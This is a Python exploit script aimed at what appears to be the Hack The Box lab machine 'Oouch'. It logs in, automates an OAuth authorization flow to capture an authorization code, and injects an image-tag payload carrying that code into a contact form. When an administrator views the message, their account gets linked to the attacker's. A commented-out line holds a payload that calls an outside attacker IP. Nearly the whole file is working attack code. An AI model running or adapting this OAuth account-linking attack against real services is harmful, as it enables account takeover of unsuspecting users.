#/usr/bin/python3

import requests,re
import base64
from bs4 import BeautifulSoup

def log_in():
    global sesion
    
    sesion = requests.Session()
    #CONSUMER
    url= "http://consumer.oouch.htb:5000/login"
    r = sesion.get(url)
    #print ("Primera Cookie " + str(r.cookies))
    coo = r.cookies
    enc = re.search(r'(input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\")(.*)\"', r.text)
    token= (enc.group(2))
    data= { "csrf_token": token, "username":"kabu","password":"12345","submit":"Sign+In"}
    r = sesion.post(url, cookies=coo, data= data, allow_redirects= False)
    
    print ("Login")
    
    #cookie_consumer = r.cookies
    
    #print ("Consumer : " + str(cookie_consumer))
    
    #OAUTH CONNECT
    
    auth_url = "http://authorization.oouch.htb:8000/login/"
    url = "http://consumer.oouch.htb:5000/oauth/connect"
    
    r = sesion.get(auth_url)
    print (r.cookies)
    enc = re.search(r'(input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\")(.*)\"', r.text)
    middle_csrf= enc.group(2)
    print ("Middle_Csrf " + middle_csrf)
    r= sesion.post(auth_url, data={"csrfmiddlewaretoken":middle_csrf,"username":"kabu","password":"pass12345"})
    #cookie_auth = sesion.cookies
    print ("Session Auth :" + str(sesion.cookies))
    
    print ("Oauth Dos")
    
    r = sesion.get(url, allow_redirects=False)
    #print (r.text)
    url_dos = r.headers['Location']
    print("Location " + url_dos)
    
    res = sesion.get(url_dos )
    soup = BeautifulSoup(res.text, 'html.parser')
    csrfmid_ = soup.find('input', {'name':'csrfmiddlewaretoken'})['value']
    params = {"csrfmiddlewaretoken": csrfmid_, "redirect_uri":"http://consumer.oouch.htb:5000/oauth/connect/token", "scope":"read","client_id":"UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82","state":"" , "response_type" :"code","allow":"Authorize" } 
    url_token ="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read"
    
    res = sesion.post(url_token, data= params ,allow_redirects=False )
    key= res.headers["Location"] 
    
    xss_explota(key)

def xss_explota(explo):
    global sesion 
    url= "http://consumer.oouch.htb:5000/contact"

    r = sesion.get(url)
    enc = re.search(r'(input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\")(.*)\"', r.text)
    csrf_token = enc.group(2)
    print ("CSRF_TOken=> " + csrf_token)
    #post
    exploit = """<Img src="""+ explo + """>"""
    #exploit="""<new Image().src="http://10.10.14.113/'+{{7*2|e}}")>"""

    params = {"csrf_token": csrf_token, "textfield": exploit , "submit": "send"}

    r = sesion.post(url, data= params)
    
    if ("message was sent" in r.text):
        print("\nMessage Sent \n", exploit)
    else:
        print (r.text)


log_in()
